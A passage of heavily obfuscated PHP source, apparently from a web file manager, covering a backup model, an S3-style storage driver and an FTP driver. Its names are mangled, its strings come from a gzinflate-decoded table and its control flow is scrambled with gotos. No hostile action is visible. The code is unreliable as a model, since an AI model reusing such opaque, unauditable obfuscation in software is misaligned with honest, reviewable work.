self::AUTH_SHOW; $ˆ†ÓÕ€ = array_sum(array_unique($·ÖÁêÒ)); } public function sort($ÂÈàäÉÅ, $¸•Î®£¤Ú‚) { return parent::update($ÂÈàäÉÅ, $¸•Î®£¤Ú‚); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x62\x61\143\153\x75\x70\x4c\x69\163\164"; public $field = array("\x69\157", "\156\x61\155\145", "\x73\x74\x61\x74\165\163", "\x63\x6f\x6e\x74\145\x6e\x74", "\155\141\x6e\165\x61\154", "\x72\145\x73\165\x6c\x74", "\x74\x69\155\x65\106\162\x6f\155", "\164\x69\155\145\x54\157"); public function config() { $…ú—§ =& $_SERVER[ÀÆ]; $ÀØ©Š²Ó÷ı‹ = Model($…ú—§[755])->get($…ú—§[767]); $ÀØ©Š²Ó÷ı‹ = json_decode($ÀØ©Š²Ó÷ı‹, !0); $ÀØ©Š²Ó÷ı‹ = is_array($ÀØ©Š²Ó÷ı‹) ? $ÀØ©Š²Ó÷ı‹ : array(); if (!isset($ÀØ©Š²Ó÷ı‹[$…ú—§[740]])) { $ÀØ©Š²Ó÷ı‹[$…ú—§[740]] = $…ú—§[87]; } unset($ÀØ©Š²Ó÷ı‹[$…ú—§[1542]]); Action($…ú—§[1763])->taskInit(); Model($…ú—§[1541])->cacheClear(); $Éï = $…ú—§[1764]; $ÙØ€ééÃ÷õ·Ç = Model($…ú—§[1765])->findByKey($…ú—§[1560], $Éï); if (!$ÙØ€ééÃ÷õ·Ç) { $ÙØ€ééÃ÷õ·Ç = array(); } if (isset($ÙØ€ééÃ÷õ·Ç[$…ú—§[197]])) { $ÙØ€ééÃ÷õ·Ç[$…ú—§[197]] = json_decode($ÙØ€ééÃ÷õ·Ç[$…ú—§[197]], !0); } if (isset($ÀØ©Š²Ó÷ı‹[$…ú—§[197]])) { $ÙØ€ééÃ÷õ·Ç[$…ú—§[197]][$…ú—§[1545]] = $ÀØ©Š²Ó÷ı‹[$…ú—§[197]]; unset($ÀØ©Š²Ó÷ı‹[$…ú—§[197]]); } return array_merge($ÙØ€ééÃ÷õ·Ç, $ÀØ©Š²Ó÷ı‹); } public function listData($òÏ»°‘‡˜í = false, $˜Ë²à = "\x6d\157\144\x69\146\x79\x54\x69\x6d\x65", $ÄÎ£¬ = false) { return parent::listData($òÏ»°‘‡˜í, $˜Ë²à, !0); } public function lastItem() { $ÙÎœ¬¯…ŠñÚ = $this->listData(); return !empty($ÙÎœ¬¯…ŠñÚ[0]) ? $ÙÎœ¬¯…ŠñÚ[0] : null; } public function kill($ÉóÕ“Ïâ) { $è×œ£× =& $_SERVER[ÀÆ]; $É™«ÁÛŒ³–é = $this->listData($ÉóÕ“Ïâ); if (!$É™«ÁÛŒ³–é || empty($É™«ÁÛŒ³–é[$è×œ£×[28]])) { return !0; } Task::kill($è×œ£×[766]); Task::kill($è×œ£×[791]); Task::kill($è×œ£×[801]); $¦Äëà…´É = $É™«ÁÛŒ³–é[$è×œ£×[28]]; $Á×çÉ•¾Ş–ˆ = TEMP_FILES . $è×œ£×[763] . $¦Äëà…´É . $è×œ£×[8]; IO::remove($Á×çÉ•¾Ş–ˆ, !1); return $this->remove($ÉóÕ“Ïâ); } public function remove($¨–·äòÊ®×) { $ÔÆ = $this->listData($¨–·äòÊ®×); if (!$ÔÆ) { return !0; } return $this->backupRemove($ÔÆ); } private function backupRemove($æÑğ¼˜†©¼ì) { parent::remove($æÑğ¼˜†©¼ì[$_SERVER[ÀÆ][395]]); $€€´ = $this->backupPath($æÑğ¼˜†©¼ì); IO::remove($€€´, !1); return !0; } private function backupPath($²ÙêŒ®) { $Å›®÷˜çé =& $_SERVER[ÀÆ]; $¼Óå¬šÊÚ = $²ÙêŒ®[$Å›®÷˜çé[28]]; $´æà£‰’ƒà = Model($Å›®÷˜çé[755])->get($Å›®÷˜çé[756]); $ëà®‰õ´­áá = substr(md5($Å›®÷˜çé[757] . $´æà£‰’ƒà . $¼Óå¬šÊÚ), 0, 8); return "\173\x69\x6f\72{$²ÙêŒ®[$Å›®÷˜çé[737]]}\x7d\x2f\x64\x61\164\x61\142\x61\x73\145\x2f\x62\141\143\x6b\x75\x70\x2f" . $¼Óå¬šÊÚ . $Å›®÷˜çé[71] . $ëà®‰õ´­áá; } public function start() { $ÛùáåÊå•¥ë =& $_SERVER[ÀÆ]; if ($GLOBALS[$ÛùáåÊå•¥ë[6]][$ÛùáåÊå•¥ë[88]][$ÛùáåÊå•¥ë[1766]] != $ÛùáåÊå•¥ë[87]) { return !0; } $¶ÌèãÅ¶Í = $this->config(); if (!$¶ÌèãÅ¶Í || $¶ÌèãÅ¶Í[$ÛùáåÊå•¥ë[1542]] != $ÛùáåÊå•¥ë[87]) { return !1; } $ø„–ëˆ = $this->process(); foreach ($ø„–ëˆ as $’­°¿‡½©¾Ù) { if ($’­°¿‡½©¾Ù) { return Task::restart($’­°¿‡½©¾Ù[$ÛùáåÊå•¥ë[395]]); } } $ıø« = new Backup(); $®¾ = $ıø«->db(); if ($®¾) { $®¾ = $ıø«->dbFile(); if ($®¾ && $¶ÌèãÅ¶Í[$ÛùáåÊå•¥ë[740]] == $ÛùáåÊå•¥ë[191]) { $®¾ = $ıø«->file(); } } Backup::set(array($ÛùáåÊå•¥ë[735] => 1, $ÛùáåÊå•¥ë[490] => time())); return !0; } public function process() { $‰«Ó =& $_SERVER[ÀÆ]; return array($‰«Ó[743] => Task::get($‰«Ó[766]), $‰«Ó[747] => Task::get($‰«Ó[791]), $‰«Ó[193] => Task::get($‰«Ó[801])); } public function restore() { $ëŒ¾œ =& $_SERVER[ÀÆ]; ActionCall($ëŒ¾œ[1051], !0, 1); ActionCall($ëŒ¾œ[1051], !0, 0); } } goto f’ÁÙÄ·ù¿; DÎ†•á·Ü: class PathDriverEDS extends PathDriverMinIO { public function __construct($ÌÚ£çŞËèèá—) { parent::__construct($ÌÚ£çŞËèèá—); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($©µèÍ) { parent::__construct($©µèÍ); $this->signatureVersion($_SERVER[ÀÆ][212]); } public function uploadFormData($¤ÔëÄ, $Åû´ëã‚ÒõÖÎ = 3600) { $ª— =& $_SERVER[ÀÆ]; $æüö² = $ª—[192]; $ìâ©»ç¬— = $ª—[1268]; $ÇıØÆò = $ª—[59]; $é‰¥ÊÈÕ™° = gmdate($ª—[1269]); $£†°ßŸ¹ÕÂ = gmdate($ª—[736]); $»¤ÈñßãŸ† = $ª—[1270]; $¶‡÷ÈÆáè§İ = $Åû´ëã‚ÒõÖÎ . $ª—[33]; $£Ôà ºİ¯çâß = $ª—[1233]; $ÇÓã = array($this->accessKey, $£†°ßŸ¹ÕÂ, $this->region, $ÇıØÆò, $»¤ÈñßãŸ†); $Õ«Ñ‘ = implode($ª—[8], $ÇÓã); $Òšõõ… = array($ª—[1235] => gmdate($ª—[1234], strtotime($ª—[1271])), $ª—[1236] => array(array($ª—[1238] => $this->bucket), array($ª—[1237] => $æüö²), array($ª—[1239], $ª—[1240], $ª—[33]), array($ª—[1239], $ª—[1272], $ª—[33]), array($ª—[1239], $ª—[1273], $ª—[33]), array($ª—[1241] => $£Ôà ºİ¯çâß), array($ª—[1274] => $Õ«Ñ‘), array($ª—[1275] => $ìâ©»ç¬—), array($ª—[1276] => $é‰¥ÊÈÕ™°), array($ª—[1277] => $¶‡÷ÈÆáè§İ))); $“Ú = base64_encode(json_encode($Òšõõ…)); $µí• = hash_hmac($ª—[1278], $£†°ßŸ¹ÕÂ, $ª—[1279] . $this->secret, !0); $×‘¾©‚ = hash_hmac($ª—[1278], $this->region, $µí•, !0); $Ÿ = hash_hmac($ª—[1278], $ÇıØÆò, $×‘¾©‚, !0); $œêÏ = hash_hmac($ª—[1278], $»¤ÈñßãŸ†, $Ÿ, !0); $öìÔ = hash_hmac($ª—[1278], $“Ú, $œêÏ); $ë¨ç“ = array($ª—[211] => $ª—[33], $ª—[1280] => $ª—[33], $ª—[1237] => $æüö², $ª—[1241] => $£Ôà ºİ¯çâß, $ª—[1245] => $“Ú, $ª—[1281] => $Õ«Ñ‘, $ª—[1282] => $ìâ©»ç¬—, $ª—[1283] => $é‰¥ÊÈÕ™°, $ª—[1284] => $¶‡÷ÈÆáè§İ, $ª—[1285] => $öìÔ, $ª—[175] => $this->getHost()); return $ë¨ç“; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($á±ç) { parent::__construct(); if (count($á±ç) > 0) { $this->_init($á±ç); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($À¼ˆÍÈˆôïÖ) { $½ú†üñ =& $_SERVER[ÀÆ]; global $config; $this->appCharset = $config[$½ú†üñ[1286]]; $this->systemCharset = $config[$½ú†üñ[1287]]; if (isset($À¼ˆÍÈˆôïÖ[$½ú†üñ[1288]]) && $À¼ˆÍÈˆôïÖ[$½ú†üñ[1288]]) { $this->systemCharset = $À¼ˆÍÈˆôïÖ[$½ú†üñ[1288]]; } } public function iconvApp($Œö) { return $this->iconvTo($Œö, $this->systemCharset, $this->appCharset); } public function iconvSystem($«ïÒ) { return $this->iconvTo($«ïÒ, $this->appCharset, $this->systemCharset); } public function getPathOuter($è…†ìËçÍş) { $‹âæ =& $_SERVER[ÀÆ]; $®¾òÚÃçò = $this->iconvApp($this->pathBase); $è…†ìËçÍş = $this->iconvApp($è…†ìËçÍş); if (substr($®¾òÚÃçò, 0, 2) == $‹âæ[1289]) { $®¾òÚÃçò = BASIC_PATH . substr($®¾òÚÃçò, 2); } if (substr($è…†ìËçÍş, 0, 2) == $‹âæ[1289]) { $è…†ìËçÍş = BASIC_PATH . substr($è…†ìËçÍş, 2); } $®¾òÚÃçò = KodIO::clear($®¾òÚÃçò); $è…†ìËçÍş = KodIO::clear($è…†ìËçÍş); $è…†ìËçÍş = substr($è…†ìËçÍş, strlen($®¾òÚÃçò)); if (empty($this->pathDriver)) { return $è…†ìËçÍş; } return $this->pathDriver . $‹âæ[8] . ltrim($è…†ìËçÍş, $‹âæ[8]); } private function _init($Äµ¹¹Â¿ÒÀ = array()) { $Åµ =& $_SERVER[ÀÆ]; if (!function_exists($Åµ[1290])) { throw new Exception(LNG($Åµ[1291])); } $this->config = $Äµ¹¹Â¿ÒÀ; $this->charsetReset($Äµ¹¹Â¿ÒÀ); foreach ($Äµ¹¹Â¿ÒÀ as $÷«±å => $ßšêâÚ‘ë) { if (isset($this->{$÷«±å})) { $this->{$÷«±å} = $ßšêâÚ‘ë; } } return $this->_login($Äµ¹¹Â¿ÒÀ); } private function _login($µÉøÎòœ§ƒ) { $ Ş¸×îî¢Ã =& $_SERVER[ÀÆ]; static $ş½ãÈÂ = array(); $ì¸‡¬ = md5(json_encode($µÉøÎòœ§ƒ)); if (isset($ş½ãÈÂ[$ì¸‡¬])) { foreach ($ş½ãÈÂ[$ì¸‡¬] as $Ø¯¤Ø€Öû => $³©¼) { $this->{$Ø¯¤Ø€Öû} = $³©¼; } return !0; } $ª´É¬ã•¤°ƒò = parse_url(trim($this->server, $ Ş¸×îî¢Ã[8])); $this->host = $ª´É¬ã•¤°ƒò[$ Ş¸×îî¢Ã[175]]; $¦àÏ = isset($ª´É¬ã•¤°ƒò[$ Ş¸×îî¢Ã[174]]) && $ª´É¬ã•¤°ƒò[$ Ş¸×îî¢Ã[174]] == $ Ş¸×îî¢Ã[1292] ? !0 : !1; $this->scheme = $¦àÏ ? $ Ş¸×îî¢Ã[1293] : $ Ş¸×îî¢Ã[1294]; $this->port = isset($ª´É¬ã•¤°ƒò[$ Ş¸×îî¢Ã[176]]) ? $ª´É¬ã•¤°ƒò[$ Ş¸×îî¢Ã[176]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Œç¢ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ºÜğš¡áÉêê = $this->pasv == $ Ş¸×îî¢Ã[87] ? !0 : !1; @ftp_pasv($this->connect, $ºÜğš¡áÉêê); $ş½ãÈÂ[$ì¸‡¬] = array($ Ş¸×îî¢Ã[1295] => $this->connect, $ Ş¸×îî¢Ã[175] => $this->host, $ Ş¸×îî¢Ã[174] => $this->scheme, $ Ş¸×îî¢Ã[176] => $this->port); return $Œç¢; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($é°ß©„ƒÒÌ, $×°Å÷û = '', $…Ñ³Ä×÷ÁË = REPEAT_RENAME) { if ($this->setContent($é°ß©„ƒÒÌ, $×°Å÷û)) { return $this->getPathOuter($é°ß©„ƒÒÌ); } return !1; } public function mkdir($ıÏ, $åÅ¹œüíË÷Ïƒ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $ıÏ = $this->iconvSystem($ıÏ); if ($this->_isFolder($ıÏ) || @ftp_mkdir($this->connect, $ıÏ)) { return $this->getPathOuter($ıÏ); } if (!$this->mkdir($this->pathFather($ıÏ))) { return !1; } if ($ıÏ = @ftp_mkdir($this->connect, $ıÏ)) { return $this->getPathOuter($ıÏ); } return !1; } public function copyFile($Œ›•, $˜±½Ãˆòİ) { if (!$this->_isconn()) { return !1; } $ßåÔş = $this->pathThis($this->iconvSystem($Œ›•)); $ÜËë‚±ÎË = $this->tempFile($ßåÔş); $Â÷¡İ = $this->iconvApp($ÜËë‚±ÎË); $this->download($Œ›•, $Â÷¡İ); $ª¨î = $this->upload($˜±½Ãˆòİ, $Â÷¡İ); $this->tempFileRemve($ÜËë‚±ÎË); return $ª¨î; } public function moveFile($ÛÙŸŸ, $“üú‚¥) { if (!$this->_isconn()) { return !1; } $ÛÙŸŸ = $this->iconvSystem($ÛÙŸŸ); $“üú‚¥ = $this->iconvSystem($“üú‚¥); $Æ©âÙÅİµ› = @ftp_rename($this->connect, $ÛÙŸŸ, $“üú‚¥); return $Æ©âÙÅİµ› ? $this->getPathOuter($“üú‚¥) : !1; } public function delFile($µßÑÆ–†‚Æ°) { if (!$this->_isconn()) { return !1; } $µßÑÆ–†‚Æ° = $this->iconvSystem($µßÑÆ–†‚Æ°); return @ftp_delete($this->connect, $µßÑÆ–†‚Æ°); } public function delFolder($£ıåöÁ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Öƒ = $Æà†ˆ¡ÕÀº = array(); $this->fileList($£ıåöÁ, $Öƒ, $Æà†ˆ¡ÕÀº, !0); $this->listItemCache = !0; foreach ($Æà†ˆ¡ÕÀº as $…ç) { $àš€‰—¯À„ = $this->iconvSystem($…ç[$_SERVER[ÀÆ][28]]); $íá¬¨õ‘ê = @ftp_delete($this->connect, $àš€‰—¯À„); if (!$íá¬¨õ‘ê) { return !1; } } foreach ($Öƒ as $àš€‰—¯À„) { $àš€‰—¯À„ = $this->iconvSystem($àš€‰—¯À„); $íá¬¨õ‘ê = @ftp_rmdir($this->connect, $àš€‰—¯À„); if (!$íá¬¨õ‘ê) { return !1; } } $£ıåöÁ = $this->iconvSystem($£ıåöÁ); return @ftp_rmdir($this->connect, $£ıåöÁ); } public function rename($‚şî©ˆ£¼ÙÂ, $ªßôÃ“¡½Æ™) { $íØàÍ¦ŞºÛ =& $_SERVER[ÀÆ]; if (!$this->_isconn()) { return !1; } $¾ìÁ ´‹Ê = $this->fileNameAuto($this->pathFather($‚şî©ˆ£¼ÙÂ), $ªßôÃ“¡½Æ™); $¾ìÁ ´‹Ê = $this->iconvSystem($¾ìÁ ´‹Ê); $‚şî©ˆ£¼ÙÂ = $this->iconvSystem($‚şî©ˆ£¼ÙÂ); $İõ¸„ïº¹²á = $this->pathFather($‚şî©ˆ£¼ÙÂ); $¢² = rtrim($İõ¸„ïº¹²á, $íØàÍ¦ŞºÛ[8]) . $íØàÍ¦ŞºÛ[8] . $¾ìÁ ´‹Ê; $™¹ = @ftp_rename($this->connect, $‚şî©ˆ£¼ÙÂ, $¢²); $¢² = $this->iconvApp($¢²); return $™¹ ? $this->getPathOuter($¢²) : !1; } private function folderInfo($¢Š†‚€Óğì, $ü§Î = false) { $ôß¯µ‘–‡ =& $_SERVER[ÀÆ]; $õó = array($ôß¯µ‘–‡[28] => $this->pathThis($¢Š†‚€Óğì), $ôß¯µ‘–‡[76] => $this->getPathOuter($ôß¯µ‘–‡[8] . $¢Š†‚€Óğì), $ôß¯µ‘–‡[29] => $ôß¯µ‘–‡[77]); if ($ü§Î) { return $õó; } $õó[$ôß¯µ‘–‡[194]] = $õó[$ôß¯µ‘–‡[84]] = 0; $õó[$ôß¯µ‘–‡[195]] = $õó[$ôß¯µ‘–‡[196]] = !0; return $õó; } private function fileInfo($Š‹œÁÊÔŸ, $•ø = false, $«ª = array()) { $ÒÂ©±º‚ =& $_SERVER[ÀÆ]; $Ûí = array($ÒÂ©±º‚[28] => $this->pathThis($Š‹œÁÊÔŸ), $ÒÂ©±º‚[76] => $this->getPathOuter($ÒÂ©±º‚[8] . $Š‹œÁÊÔŸ), $ÒÂ©±º‚[29] => $ÒÂ©±º‚[193], $ÒÂ©±º‚[78] => isset($«ª[$ÒÂ©±º‚[78]]) ? $«ª[$ÒÂ©±º‚[78]] : 0, $ÒÂ©±º‚[168] => $this->ext($Š‹œÁÊÔŸ)); if ($•ø) { return $Ûí; } $Ûí[$ÒÂ©±º‚[194]] = $Ûí[$ÒÂ©±º‚[84]] = 0; $Ûí[$ÒÂ©±º‚[195]] = $Ûí[$ÒÂ©±º‚[196]] = !0; $²¯­ªÃ”²Åß = $this->iconvSystem($Š‹œÁÊÔŸ); $Ûí[$ÒÂ©±º‚[84]] = @ftp_mdtm($this->connect, $²¯­ªÃ”²Åß); if (empty($«ª)) { $«ª = $this->objectMeta($Š‹œÁÊÔŸ); if (!$«ª) { return $Ûí; } } $Ûí[$ÒÂ©±º‚[78]] = $«ª[$ÒÂ©±º‚[78]]; return $Ûí; } public function size($¼¤™½ÚÔ¤) { $›èû = $this->objectMeta($¼¤™½ÚÔ¤); return $›èû ? $›èû[$_SERVER[ÀÆ][78]] : 0; } public function info($â»ş©) { if ($this->isFile($â»ş©)) { return $this->fileInfo($â»ş©, 0); } else { if ($this->isFolder($â»ş©)) { return $this->folderInfo($â»ş©); } } return !1; } private function fileList($°ó¿’ˆÏ, &$ê×, &$Ë´Ëùõ‰¹Â²ı, $ìøÂ§… = false) { $ıÊ´öô´¢­» =& $_SERVER[ÀÆ]; $°ó¿’ˆÏ = $this->iconvSystem($°ó¿’ˆÏ); if (!$this->isFolder($°ó¿’ˆÏ)) { return !1; } @ftp_chdir($this->connect, $ıÊ´öô´¢­»[8]); $°ó¿’ˆÏ = rtrim($°ó¿’ˆÏ, $ıÊ´öô´¢­»[8]) . $ıÊ´öô´¢­»[8]; check_abort(); $¢ºêü¾ = $this->listItemCache === !1 ? !1 : !0; $¿° = @ftp_rawlist($this->connect, $°ó¿’ˆÏ); if (!$¿°) { $¿° = array(); } $ñÌ¬Êïã = array($ıÊ´öô´¢­»[95] => 1, $ıÊ´öô´¢­»[1296] => 1); foreach ($¿° as $„ìÓ–’š) { $ó’Ë = $this->_listItem($„ìÓ–’š); if ($ó’Ë[0] == $ıÊ´öô´¢­»[744]) { continue; } $¡¤‹®ÎøÛ = $ó’Ë[8]; if (empty($¡¤‹®ÎøÛ) && $¡¤‹®ÎøÛ !== $ıÊ´öô´¢­»[191] || isset($ñÌ¬Êïã[$¡¤‹®ÎøÛ])) { continue; } $¡¤‹®ÎøÛ = $this->iconvApp($°ó¿’ˆÏ . ltrim($¡¤‹®ÎøÛ, $ıÊ´öô´¢­»[8])); $¦«¥ÒµÊå— = array($ıÊ´öô´¢­»[28] => $¡¤‹®ÎøÛ, $ıÊ´öô´¢­»[29] => $ıÊ´öô´¢­»[193], $ıÊ´öô´¢­»[78] => $ó’Ë[4]); if (substr($„ìÓ–’š, 0, 1) == $ıÊ´öô´¢­»[1297]) { $¦«¥ÒµÊå—[$ıÊ´öô´¢­»[29]] = $ıÊ´öô´¢­»[77]; $¦«¥ÒµÊå—[$ıÊ´öô´¢­»[78]] = 0; } $ûæÂœèÀ¹é = $¦«¥ÒµÊå—[$ıÊ´öô´¢­»[29]] == $ıÊ´öô´¢­»[77] ? !0 : !1; if ($¢ºêü¾) { $this->cacheMethod($ıÊ´öô´¢­»[199], $¡¤‹®ÎøÛ, $ûæÂœèÀ¹é); $this->cacheMethod($ıÊ´öô´¢­»[200], $¡¤‹®ÎøÛ, $¦«¥ÒµÊå—); } if ($ûæÂœèÀ¹é) { $ê×[] = $¡¤‹®ÎøÛ; if ($ìøÂ§…) { $this->fileList($¡¤‹®ÎøÛ, $ê×, $Ë´Ëùõ‰¹Â²ı, $ìøÂ§…); } continue; } $Ë´Ëùõ‰¹Â²ı[] = $¦«¥ÒµÊå—; } if ($¢ºêü¾) { $this->cacheMethod($ıÊ´öô´¢­»[199], $°ó¿’ˆÏ, !0); } } private function _listItem($¬±»ŞÚÖà) { if (empty($¬±»ŞÚÖà)) { return array(); } $´öÓß = preg_split($_SERVER[ÀÆ][1298], $¬±»ŞÚÖà); if (count($´öÓß) <= 9) { return $´öÓß; } $´öÓß[8] = trim(substr($¬±»ŞÚÖà, strpos($¬±»ŞÚÖà, $´öÓß[7]) + strlen($´öÓß[7]))); return array_splice($´öÓß, 0, 9); } public function listPath($ıîÆ, $½øàİ…¦ò = false) { $æ‘½îÈŠ =& $_SERVER[ÀÆ]; if (!$this->_isconn()) { return !1; } $œ®Î¦Å‹¶å = $­Ø = array(); $this->fileList($ıîÆ, $œ®Î¦Å‹¶å, $­Ø); foreach ($œ®Î¦Å‹¶å as $¶¶ú­Ö => $ƒùÙğ­¶) { $œ®Î¦Å‹¶å[$¶¶ú­Ö] = $this->folderInfo($ƒùÙğ­¶, $½øàİ…¦ò); } foreach ($­Ø as $¶¶ú­Ö => $ƒùÙğ­¶) { $­Ø[$¶¶ú­Ö] = $this->fileInfo($ƒùÙğ­¶[$æ‘½îÈŠ[28]], $½øàİ…¦ò, $ƒùÙğ­¶); } return array($æ‘½îÈŠ[75] => $œ®Î¦Å‹¶å, $æ‘½îÈŠ[74] => $­Ø); } public function has($¦¯, $À‰Š½ãµ¨ˆî = false, $Ÿ‹â = true) { $üé¥¿‹Æò =& $_SERVER[ÀÆ]; $è¼ƒÈ’”»Õİ = $à˜„Äá¯ = array(); $˜¨‹ôï´® = $À‰Š½ãµ¨ˆî ? !0 : !1; $this->fileList($¦¯, $è¼ƒÈ’”»Õİ, $à˜„Äá¯, $˜¨‹ôï´®); if ($À‰Š½ãµ¨ˆî) { return array($üé¥¿‹Æò[203] => count($à˜„Äá¯), $üé¥¿‹Æò[204] => count($è¼ƒÈ’”»Õİ)); } if ($Ÿ‹â) { if (count($à˜„Äá¯)) { return !0; } } else { if (count($è¼ƒÈ’”»Õİ)) { return !0; } } return !1; } public function listAll($¶ÒÇ±) { $Äüƒ§©öï =& $_SERVER[ÀÆ]; if (!$this->_isconn()) { return !1; } $ıÉ = $¦¤çü…şÙ²°ò = array(); $this->fileList($¶ÒÇ±, $ıÉ, $¦¤çü…şÙ²°ò, !0); $ÄÕ‹– = array(); foreach ($¦¤çü…şÙ²°ò as $•É¢¼ÍˆËğ) { $ÄÕ‹–[$•É¢¼ÍˆËğ[$Äüƒ§©öï[28]]] = $•É¢¼ÍˆËğ[$Äüƒ§©öï[78]]; } foreach ($ıÉ as $•É¢¼ÍˆËğ) { if (is_string($•É¢¼ÍˆËğ)) { $ÄÕ‹–[$•É¢¼ÍˆËğ] = 0; } } return $this->listAllFiles($¶ÒÇ±, array_keys($ÄÕ‹–), $ÄÕ‹–); } public function getContent($µÚ³Ñèô©Ï) { if (!$this->_isconn()) { return !1; } $µÚ³Ñèô©Ï = $this->iconvSystem($µÚ³Ñèô©Ï); return $this->fileSubstr($µÚ³Ñèô©Ï); } public function setContent($¦©Ç, $“ÙÉÍ·«Øº = '') { if (!$this->_isconn()) { return !1; } $ Ê = $this->pathThis($this->iconvSystem($¦©Ç)); $½¯Ëõ¾ = $this->tempFile($ Ê); file_put_contents($½¯Ëõ¾, $“ÙÉÍ·«Øº); $êãµƒ»›è•ö = $this->upload($¦©Ç, $this->iconvApp($½¯Ëõ¾)); $this->tempFileRemve($½¯Ëõ¾); return $êãµƒ»›è•ö; } public function fileSubstr($¨³ªÙÀ, $™Ã– = 0, $Ÿß„äš = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¨³ªÙÀ, $™Ã–, $Ÿß„äš); } private function ftpRequest($²í­ğ®, $İá–¯ = 0, $¾»è· = false) { $²í­ğ® = $this->iconvSystem($²í­ğ®); $£Ğ–æ¼ğİ•ë = $this->scheme . $this->host . $_SERVER[ÀÆ][4] . $this->port; $°ı†¿Ÿ = curl_init(); curl_setopt($°ı†¿Ÿ, CURLOPT_URL, $£Ğ–æ¼ğİ•ë . $this->pathEncode($²í­ğ®)); curl_setopt($°ı†¿Ÿ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($¾»è·) { $†¹ü¡ = $İá–¯ + $¾»è· - 1; curl_setopt($°ı†¿Ÿ, CURLOPT_RANGE, "{$İá–¯}\x2d{$†¹ü¡}"); } curl_setopt($°ı†¿Ÿ, CURLOPT_RETURNTRANSFER, 1); $Âøºªø = curl_exec($°ı†¿Ÿ); curl_close($°ı†¿Ÿ); return $Âøºªø; } public function upload($ÇÂ¹Æ, $Š²©£‹œ„»ùØ, $ÙİÅí½Ü = false, $É¡¬µû = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ÇÂ¹Æ))) { return !1; } $ÇÂ¹Æ = $this->iconvSystem($ÇÂ¹Æ); $Š²©£‹œ„»ùØ = $this->iconvSystem($Š²©£‹œ„»ùØ); $æ½ = ftp_nb_put($this->connect, $ÇÂ¹Æ, $Š²©£‹œ„»ùØ, FTP_BINARY); while ($æ½ == FTP_MOREDATA) { $æ½ = ftp_nb_continue($this->connect); } if ($æ½ != FTP_FINISHED) { return !1; } return $this->getPathOuter($ÇÂ¹Æ); } public function download($ÍÈıê, $ºí£›¬˜¤Âä = '') { if (!$this->_isconn()) { return !1; } $„†µô = $this->pathFather($ºí£›¬˜¤Âä); if (!IO::mkdir($„†µô)) { return !1; } $ÍÈıê = $this->iconvSystem($ÍÈıê); $ºí£›¬˜¤Âä = $this->iconvSystem($ºí£›¬˜¤Âä); $´—Ì²Î¸×˜ = ftp_nb_get($this->connect, $ºí£›¬˜¤Âä, $ÍÈıê, FTP_BINARY); while ($´—Ì²Î¸×˜ == FTP_MOREDATA) { $´—Ì²Î¸×˜ = ftp_nb_continue($this->connect); } if ($´—Ì²Î¸×˜ != FTP_FINISHED) { return !1; } return $this->iconvApp($ºí£›¬˜¤Âä); } public function exist($ö²å¯àäÄ²¼³) { return $this->isFile($ö²å¯àäÄ²¼³) || $this->isFolder($ö²å¯àäÄ²¼³); } public function isFile($ÇØ¡€€„ğ¬) { return !$this->isFolder($ÇØ¡€€„ğ¬) && $this->objectMeta($ÇØ¡€€„ğ¬); } public function isFolder($ƒÂİ”ñäÈ¬) { return $this->cacheMethod($_SERVER[ÀÆ][199], $ƒÂİ”ñäÈ¬); } protected function objectMeta($ã½‚·) { return $this->cacheMethod($_SERVER[ÀÆ][200], $ã½‚·); } protected function _objectMeta($íÔ) { $Ñš¿ =& $_SERVER[ÀÆ]; if ($íÔ == $Ñš¿[33] || $íÔ == $Ñš¿[8]) { return array(); } if (!$this->_isconn()) { return !1; } $íÔ = $this->iconvSystem($íÔ); $“¥•Òûó²ÕÄ = array($Ñš¿[28] => $this->iconvApp($íÔ), $Ñš¿[29] => $Ñš¿[193], $Ñš¿[78] => 0); @ftp_chdir($this->connect, $Ñš¿[8]); $òÍàÏäì³ÉŞ = @ftp_size($this->connect, $íÔ); if ($òÍàÏäì³ÉŞ != -1) { $“¥•Òûó²ÕÄ[$Ñš¿[78]] = $òÍàÏäì³ÉŞ; } else { $±š’í³Éå‡„ = @ftp_chdir($this->connect, $íÔ); if (!$±š’í³Éå‡„) { return !1; } $“¥•Òûó²ÕÄ[$Ñš¿[29]] = $Ñš¿[77]; } return $“¥•Òûó²ÕÄ; } protected function _isFolder($æşÄ×İÂ€­¡) { $”ç›Ì =& $_SERVER[ÀÆ]; if ($æşÄ×İÂ€­¡ == $”ç›Ì[33] || $æşÄ×İÂ€­¡ == $”ç›Ì[8]) { return !0; } $ß§ = $this->_objectMeta($æşÄ×İÂ€­¡); return isset($ß§[$”ç›Ì[29]]) && $ß§[$”ç›Ì[29]] == $”ç›Ì[77] ? !0 : !1; } } goto EÏ¶ˆ’; d£³®Âª…: define($_SERVER[ÀÆ][239], 1); define($_SERVER[ÀÆ][240], 0); define($_SERVER[ÀÆ][241], 2); goto CŒôáñŒ; fô Ë‘“¾’: define($_SERVER[ÀÆ][598], $_SERVER[ÀÆ][599]); $qgdwxjbhor = $_SERVER[ÀÆ][600]; $_SERVER[Å´] = explode($_SERVER[ÀÆ][601], gzinflate(substr($_SERVER[ÀÆ][602], 10, -8))); goto E‰„¹¡ãËÌ; E‰„¹¡ãËÌ: $ajdxiwesuz = $_SERVER[ÀÆ][603]; while ($ajdxiwesuz < $_SERVER[ÀÆ][604]) { if ($ajdxiwesuz >= 0) { break; } $ajdxiwesuz++; } class Application { private $defaultModule = "\x69\156\x64\145\170"; private $defaultController = "\151\156\144\x65\x78"; private $defaultAction = "\x69\x6e\x64\145\x78"; function __construct() { } public function setDefault($¥¾¬µ¿˜) { $ÒÔì¯øê =& $_SERVER[ÀÆ]; $Îë¿¬– =& 